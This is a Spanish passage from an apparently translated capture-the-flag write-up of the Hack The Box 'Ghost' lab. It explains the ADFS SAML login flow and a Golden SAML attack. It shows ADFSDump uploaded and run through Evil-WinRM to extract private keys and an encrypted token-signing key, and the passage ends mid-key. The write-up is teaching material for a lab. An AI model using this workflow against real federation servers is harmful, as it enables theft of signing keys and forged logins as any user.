#### Antecedentes de ADFS

Active Directory Federation Services (ADFS) es un producto de inicio de sesión único (SSO) de Microsoft que permite acceder a otros servicios mediante el lenguaje de marcado de aserciones de seguridad (SAML) (u otros protocolos como OAuth). Permite que AD actúe como proveedor de identidad (IdP) para iniciar sesión en aplicaciones que no son de Microsoft.

ADFS_GMSA$ es la cuenta de servicio en Ghost utilizada por ADFS, que ahora controlo.

Voy a analizar el flujo de autenticación para iniciar sesión `https://core.ghost.htb:8443`mediante el botón "Iniciar sesión mediante federación de AD":

![imagen-20250331073540816](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331073540816.png)

Esto genera las dos solicitudes siguientes:

![imagen-20250331073700046](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331073700046.png)

Obtiene `/api/login`, que devuelve una redirección a `https://federation.ghost.htb/adfs/ls/`con un `SAMLRequest`parámetro. Esta página proporciona la página de inicio de sesión:

![imagen-20250331073752242](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331073752242.png)

Al iniciar sesión aquí, se le harán una serie de solicitudes:

![imagen-20250331073953114](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331073953114.png)

La primera solicitud POST envía las credenciales y, si tiene éxito, establece una cookie y redirige de vuelta a la página original. Esa página ahora solo tiene un formulario llamado "formulario oculto" que contiene la información `SAMLResponse`con un destino de vuelta al sitio original:

![imagen-20250331074101594](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331074101594.png)

Y JavaScript para enviar ese formulario:

![imagen-20250331074133430](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331074133430.png)

Cuando se envía este formulario, la respuesta firmada se envía de vuelta al sitio, que ahora tiene una identidad para el usuario. La respuesta POST establece una cookie y redirige a `/`. `/`ve que este usuario no puede acceder a la página principal y redirige a `/unauthorized`.

El proceso de autenticación logró identificar correctamente al usuario desde Active Directory en el sitio, incluso si el sitio luego limitó los privilegios de ese usuario.

Se `SAMLResponse`puede decodificar en base64 para generar XML:

```
oxdf@hacky$ echo "PHNhbWxwOlJlc3BvbnNlIElEPSJfZDVkNzAyOTEtNTMwMy00YjQyLTlkNzQtNjhmOGE1NWNjOGJlIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMy0zMVQxMTo0MToyOC4xMDhaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIiBJblJlc3BvbnNlVG89Il9hN2JmMmIzZmVhMzRiNDA5YzI5ZjFhN2ZhNDg5ODM1NWZiOTNjMTMxIiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIgLz48L3NhbWxwOlN0YXR1cz48QXNzZXJ0aW9uIElEPSJfYTQ3ZDFhODYtZDQ0Ni00NTI2LTg1NDAtODg1MzI2NzI2NWQyIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDMtMzFUMTE6NDE6MjguMTA4WiIgVmVyc2lvbj0iMi4wIiB4bWxucz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+PElzc3Vlcj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIiAvPjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiAvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2E0N2QxYTg2LWQ0NDYtNDUyNi04NTQwLTg4NTMyNjcyNjVkMiI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIiAvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIC8+PC9kczpUcmFuc2Zvcm1zPjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNzaGEyNTYiIC8+PGRzOkRpZ2VzdFZhbHVlPncrUEFCNnM4elovVy9JVzEyVDJHbExiUGx3Zy85eVh1NmNjdWVpOHZ4Mkk9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8+PGRzOlNpZ25hdHVyZVZhbHVlPkpPN0lYQXBSdXpnL25xck96U3ZMbXR4SFdkTFhFa0VvYlA1VDdvMWM1Zi9PVCtDOGZ2R3FCTGRjSW0waU9SdlNyUTJtZmJXKzI4RVF1TDJnYXIrMm51MU1GT0xoREdDVW8wWGRScXBPc21RZUJiVTRodTQ0NlBuVmkyZCtuOGVjWlAzd0YrRE9BTEtVT05Kbkd5MGxrSEdYN08zZnBQZG1UVnh1NGFpRVFySWF4Y01tNFpBR1FpVi9KWUxRNmF0RWhaeE1Db0k5T0tNcnBWVEVCSVFXNGROZnVUOGJrZmxWSWVoWXlER3FKSDJhTy9FNVU1S1o3Z1FHTnlMbDVPRDY3c25EV1BvenJBbU1VZFZsalFGeEhkb0h2NWRGU24rWlVrVzRaSUlIajRVQi9QZHpUY0pZTDBMNklwZFJzT1NlUlpjNGxXbnRoV2xYSDhwZDhndGk4aGhjcWZMaWVGVVIwTmJwTGtEaXEvd3ZLZGVmUVNXSmY5a2diWndWeTJGYUJTZGk2R3g4ZGxIRDZyeXphSTd1ZC9VcEtrVTZ3VDhPZ3B3Mm1LbmxMWml3dmVHZjFsTXNRNklCZE1ac0ZpUUJqaHpFQ3ZORWk2TmkvUENGNlpQRVlWQW5UU0FiY0Q3ZEVCandyVW9WNUNvZ0ZjUWxZUm1PaUxFekFzd21mYUZVUkxIOVdDTEVlYmxWVjczeldBZzJxazZVZnltYjVUWmpRSDlVR2lXcGlmSDgzcDA0R2RJdHN5TVY2UW9nWjNFdDZFWkwrWmZXREhVQTFxQTcxcjNDekZMQzgwdjNOT1Bpakx0a2YrcEEzLytKTmZNRjlFTFgyRmRKcTBzMC9UaWZibDlHRHZnbWRsSUMyRXFPWjJvMHlVUGFKWERwRUhjbjV3cFFWbmJXK2JZPTwvZHM6U2lnbmF0dXJlVmFsdWU+PEtleUluZm8geG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUU1akNDQXM2Z0F3SUJBZ0lRSkZjV3dNeWJSYTVPNCtXTzV0V29HVEFOQmdrcWhraUc5dzBCQVFzRkFEQXVNU3d3S2dZRFZRUURFeU5CUkVaVElGTnBaMjVwYm1jZ0xTQm1aV1JsY21GMGFXOXVMbWRvYjNOMExtaDBZakFnRncweU5EQTJNVGd4TmpFM01UQmFHQTh5TVRBME1EVXpNREUyTVRjeE1Gb3dMakVzTUNvR0ExVUVBeE1qUVVSR1V5QlRhV2R1YVc1bklDMGdabVZrWlhKaGRHbHZiaTVuYUc5emRDNW9kR0l3Z2dJaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQ0R3QXdnZ0lLQW9JQ0FRQytBQU9JZkVxdGxZY24xNTNMMUJ2R1FnRHlYVG5Zd1RSenNLNTkrekUxemdHS085TjVuYjhGaytkYUtwV0xRYWlIN29ESGFlbncvUWF4Qmc1cWRlRFltRDNvejhLeWFBMXlnWUJyem00d1c3RmY4N3JLOUZlNUo1L2g2VzlnNzQ5aDVCSXFQUU9wMGw2czFyZnVtT2NjTjR5Ylc5NUVXTkwwdnVRWHZDK0tRNEQ0Z01YdThtQ0dweHR2SUw4aWxOdEp1SUczT1JZU0toUmFsMHl5SmVPaEc0eGdsclpKRjE4cDl3aG5FNm9tZ2dtQTZuMnNoRGsvdHZUWWppaTVlNy9pY1dUS2tyc01DcGFLVU5rN214ZE1aaFFhYjdTbWZLclpONHBSRDdkVmc1enpJeUQ3VXpTOUNITEM2eE56cS9aMGh1YU9hSmhPU2RKU2dhdC9ic0c4bmJ4MTlIRC8reXBXOUoyTHRORnVnZFd0bVVCV0RPUUJZVmhCOFNnNFZFR2dQOWp5SXRISDJienNEZmpSZEo4RTF1TkpXUC9rUUExK3dZbE9kZExxVTNiMElzQ3ZsQThFdllXMFQxUnN1NzdvNHgvdzBnV2Iwb1FQRUl6N3o5NzNiNDk2d3FRdDNEbnlmZU8zbFhYZlpOY3ZhajVLQ1AyVHRHQitLc2hGOXBrSVB4cTdGMmdNaDdRanhqUkhzQTI5VjhqRm85Z0xEN2tQVmljYUlVZHNnaUZIbllRRjE0YTUySnRSMVY1aU4raDk1Smt1dUVxUVdEQkhBdlBFQkJaa0VaSCs1eVQrYUNGWFhYK0JwUHQzUUdqWUxlSlU4Q0ZzTXRuOFFWTFl2TGRjVlJzVW5SaC9XSGlYd0pPT0VWRUNhOXc3L3lWbmhhbENOQngxRS9sNEtRSURBUUFCTUEwR0NTcUdTSWIzRFFFQkN3VUFBNElDQVFBV1lLWlczY0RDQk82ZFQzeWZsM09jdXlwMUxWS1ZJKzlwRngvYmJXcFdqU2RoNmIzOUxUeHhEN0ZZVXRodVdQWjNyRjRHK0ZkTUZISEN4M1lwRW1VRm5FTEtzWHFoWjk4OUFYNThJLzNtYmZVbEtXZUlQTFNMa3ArZVJab01Ka3Q3azEvS1h0RGFzT1FuME5zZ1lFb3dMQkltTUNNdTl1dWpuQ21GT3dIUC9JQmhnWVFNSGg0NkJ6U1hXUDNpOFZYYnJSdERwby9jLy9PRkpoR21ubkY4WlBtaTR4dHpmU0RCcFZLcXdWTHA3OENndU14alFkK2JkVWI0NTU4OFpKNENMc1BkUlFwMzBXSjEvQ05JYWVudkpXdEEyRzVJWnc1VTBFV0NKTG9ZSldGczlpeU9hMS95NTVydVc2SjhsSUdEMHdtb0VlQ2w5Q0gxRWQ0ZHpVZFVYZjFNQkNZUDNYOTJpYXh6VUUwdXBHZC8xUW82SFR5eU9sV3VBd3JrVDJWSEVMS1ZaS09nOCtkbHk5N2d5WklmVXRRd0lrUHdObDh2bzA0Y2ZqK2h6T3ZCelBLQUFZaDE0TkxndmVBSS9EcU1uTzBPS08rdzFIQkt3NjROQkNuOGdvYXpGK1B1RmZVTzB5TkhGTDRreE1wY2FwNmlldjZnM0JYQ1NEd2ZxVFVPRXVFczdxOW9ZS2dxMnFuTlZPVEloaEluTVhCekVtNmlQMTNqZnVPb1hKZFBBbkVVWG40eTV5d0E5N3J0YkduWkVQeXgxZjFFa1gvaGJxQlA0dm9ndjlrbHRhVUVFVlhrUytoUHB4Wm1leENOckJEMXE3R0ovNTBlYllsQzBDZXY4dzZNczh0TTBPcnZwcEdZbFdydFB3ZXZFdmZpUmt3QkxHN0VNQW5MU3c9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE+PC9LZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxTdWJqZWN0PjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iX2E3YmYyYjNmZWEzNGI0MDljMjlmMWE3ZmE0ODk4MzU1ZmI5M2MxMzEiIE5vdE9uT3JBZnRlcj0iMjAyNS0wMy0zMVQxMTo0NjoyOC4xMDhaIiBSZWNpcGllbnQ9Imh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0My9hZGZzL3NhbWwvcG9zdFJlc3BvbnNlIiAvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTAzLTMxVDExOjQxOjI4LjEwOFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0wMy0zMVQxMjo0MToyOC4xMDhaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U+aHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24+PC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ+PEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5qdXN0aW4uYnJhZGxleUBnaG9zdC5odGI8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvY2xhaW1zL0NvbW1vbk5hbWUiPjxBdHRyaWJ1dGVWYWx1ZT5qdXN0aW4uYnJhZGxleTwvQXR0cmlidXRlVmFsdWU+PC9BdHRyaWJ1dGU+PC9BdHRyaWJ1dGVTdGF0ZW1lbnQ+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyNS0wMy0zMVQxMTo0MToxNi41MTRaIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY+PC9BdXRobkNvbnRleHQ+PC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg==" | base64 -d | xmllint - --format
<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d5d70291-5303-4b42-9d74-68f8a55cc8be" Version="2.0" IssueInstant="2025-03-31T11:41:28.108Z" Destination="https://core.ghost.htb:8443/adfs/saml/postResponse" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_a7bf2b3fea34b409c29f1a7fa4898355fb93c131">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://federation.ghost.htb/adfs/services/trust</Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a47d1a86-d446-4526-8540-8853267265d2" IssueInstant="2025-03-31T11:41:28.108Z" Version="2.0">
    <Issuer>http://federation.ghost.htb/adfs/services/trust</Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_a47d1a86-d446-4526-8540-8853267265d2">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>w+PAB6s8zZ/W/IW12T2GlLbPlwg/9yXu6ccuei8vx2I=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>JO7IXApRuzg/nqrOzSvLmtxHWdLXEkEobP5T7o1c5f/OT+C8fvGqBLdcIm0iORvSrQ2mfbW+28EQuL2gar+2nu1MFOLhDGCUo0XdRqpOsmQeBbU4hu446PnVi2d+n8ecZP3wF+DOALKUONJnGy0lkHGX7O3fpPdmTVxu4aiEQrIaxcMm4ZAGQiV/JYLQ6atEhZxMCoI9OKMrpVTEBIQW4dNfuT8bkflVIehYyDGqJH2aO/E5U5KZ7gQGNyLl5OD67snDWPozrAmMUdVljQFxHdoHv5dFSn+ZUkW4ZIIHj4UB/PdzTcJYL0L6IpdRsOSeRZc4lWnthWlXH8pd8gti8hhcqfLieFUR0NbpLkDiq/wvKdefQSWJf9kgbZwVy2FaBSdi6Gx8dlHD6ryzaI7ud/UpKkU6wT8Ogpw2mKnlLZiwveGf1lMsQ6IBdMZsFiQBjhzECvNEi6Ni/PCF6ZPEYVAnTSAbcD7dEBjwrUoV5CogFcQlYRmOiLEzAswmfaFURLH9WCLEeblVV73zWAg2qk6Ufymb5TZjQH9UGiWpifH83p04GdItsyMV6QogZ3Et6EZL+ZfWDHUA1qA71r3CzFLC80v3NOPijLtkf+pA3/+JNfMF9ELX2FdJq0s0/Tifbl9GDvgmdlIC2EqOZ2o0yUPaJXDpEHcn5wpQVnbW+bY=</ds:SignatureValue>
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>MIIE5jCCAs6gAwIBAgIQJFcWwMybRa5O4+WO5tWoGTANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDEyNBREZTIFNpZ25pbmcgLSBmZWRlcmF0aW9uLmdob3N0Lmh0YjAgFw0yNDA2MTgxNjE3MTBaGA8yMTA0MDUzMDE2MTcxMFowLjEsMCoGA1UEAxMjQURGUyBTaWduaW5nIC0gZmVkZXJhdGlvbi5naG9zdC5odGIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC+AAOIfEqtlYcn153L1BvGQgDyXTnYwTRzsK59+zE1zgGKO9N5nb8Fk+daKpWLQaiH7oDHaenw/QaxBg5qdeDYmD3oz8KyaA1ygYBrzm4wW7Ff87rK9Fe5J5/h6W9g749h5BIqPQOp0l6s1rfumOccN4ybW95EWNL0vuQXvC+KQ4D4gMXu8mCGpxtvIL8ilNtJuIG3ORYSKhRal0yyJeOhG4xglrZJF18p9whnE6omggmA6n2shDk/tvTYjii5e7/icWTKkrsMCpaKUNk7mxdMZhQab7SmfKrZN4pRD7dVg5zzIyD7UzS9CHLC6xNzq/Z0huaOaJhOSdJSgat/bsG8nbx19HD/+ypW9J2LtNFugdWtmUBWDOQBYVhB8Sg4VEGgP9jyItHH2bzsDfjRdJ8E1uNJWP/kQA1+wYlOddLqU3b0IsCvlA8EvYW0T1Rsu77o4x/w0gWb0oQPEIz7z973b496wqQt3DnyfeO3lXXfZNcvaj5KCP2TtGB+KshF9pkIPxq7F2gMh7QjxjRHsA29V8jFo9gLD7kPVicaIUdsgiFHnYQF14a52JtR1V5iN+h95JkuuEqQWDBHAvPEBBZkEZH+5yT+aCFXXX+BpPt3QGjYLeJU8CFsMtn8QVLYvLdcVRsUnRh/WHiXwJOOEVECa9w7/yVnhalCNBx1E/l4KQIDAQABMA0GCSqGSIb3DQEBCwUAA4ICAQAWYKZW3cDCBO6dT3yfl3Ocuyp1LVKVI+9pFx/bbWpWjSdh6b39LTxxD7FYUthuWPZ3rF4G+FdMFHHCx3YpEmUFnELKsXqhZ989AX58I/3mbfUlKWeIPLSLkp+eRZoMJkt7k1/KXtDasOQn0NsgYEowLBImMCMu9uujnCmFOwHP/IBhgYQMHh46BzSXWP3i8VXbrRtDpo/c//OFJhGmnnF8ZPmi4xtzfSDBpVKqwVLp78CguMxjQd+bdUb45588ZJ4CLsPdRQp30WJ1/CNIaenvJWtA2G5IZw5U0EWCJLoYJWFs9iyOa1/y55ruW6J8lIGD0wmoEeCl9CH1Ed4dzUdUXf1MBCYP3X92iaxzUE0upGd/1Qo6HTyyOlWuAwrkT2VHELKVZKOg8+dly97gyZIfUtQwIkPwNl8vo04cfj+hzOvBzPKAAYh14NLgveAI/DqMnO0OKO+w1HBKw64NBCn8goazF+PuFfUO0yNHFL4kxMpcap6iev6g3BXCSDwfqTUOEuEs7q9oYKgq2qnNVOTIhhInMXBzEm6iP13jfuOoXJdPAnEUXn4y5ywA97rtbGnZEPyx1f1EkX/hbqBP4vogv9kltaUEEVXkS+hPpxZmexCNrBD1q7GJ/50ebYlC0Cev8w6Ms8tM0OrvppGYlWrtPwevEvfiRkwBLG7EMAnLSw==</ds:X509Certificate>
        </ds:X509Data>
      </KeyInfo>
    </ds:Signature>
    <Subject>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData InResponseTo="_a7bf2b3fea34b409c29f1a7fa4898355fb93c131" NotOnOrAfter="2025-03-31T11:46:28.108Z" Recipient="https://core.ghost.htb:8443/adfs/saml/postResponse"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2025-03-31T11:41:28.108Z" NotOnOrAfter="2025-03-31T12:41:28.108Z">
      <AudienceRestriction>
        <Audience>https://core.ghost.htb:8443</Audience>
      </AudienceRestriction>
    </Conditions>
    <AttributeStatement>
      <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
        <AttributeValue>justin.bradley@ghost.htb</AttributeValue>
      </Attribute>
      <Attribute Name="http://schemas.xmlsoap.org/claims/CommonName">
        <AttributeValue>justin.bradley</AttributeValue>
      </Attribute>
    </AttributeStatement>
    <AuthnStatement AuthnInstant="2025-03-31T11:41:16.514Z">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
</samlp:Response>
```

![expandir](https://0xdf.gitlab.io/icons/collapse.png)

Contiene `AttributeStatement`las afirmaciones de lo que es este usuario:

```
 <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
        <AttributeValue>justin.bradley@ghost.htb</AttributeValue>
      </Attribute>
      <Attribute Name="http://schemas.xmlsoap.org/claims/CommonName">
        <AttributeValue>justin.bradley</AttributeValue>
      </Attribute>
```

Usaré este formato más adelante.

#### Fondo SAML dorado

[Esta publicación](https://www.netwrix.com/golden_saml_attack.html) de netwrix explica los pasos de un ataque Golden SAML. La idea es extraer la clave privada del servidor para poder falsificar `SAMLResponse`mensajes. Luego, puedo iniciar sesión en la aplicación como cualquier usuario.

La publicación muestra cómo usar [ADFSDump](https://github.com/mandiant/ADFSDump) , una herramienta de Mandiant, para recuperar esta información. Después de reformatearla, usa otra herramienta de Mandiant, [ADFSSpoof.py](https://github.com/mandiant/ADFSpoof) , para falsificar un archivo `SAMLResponse`y luego lo inserta en el flujo para obtener la autenticación.

#### Material de volcado de claves ADFS

Voy a descargar una copia de `ADFSDump.exe`SharpCollection [y](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/ADFSDump.exe) subirla a Ghost:

```
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> upload ADFSDump.exe

Info: Uploading /home/oxdf/hackthebox/ghost-10.10.11.24/ADFSDump.exe to C:\Users\adfs_gmsa$\Documents\ADFSDump.exe

Data: 38912 bytes of 38912 bytes copied

Info: Upload successful!
```

Al ejecutarlo, se descarga todo el material de ADFS:

```
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> .\ADFSDump.exe
    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec


## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1

## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
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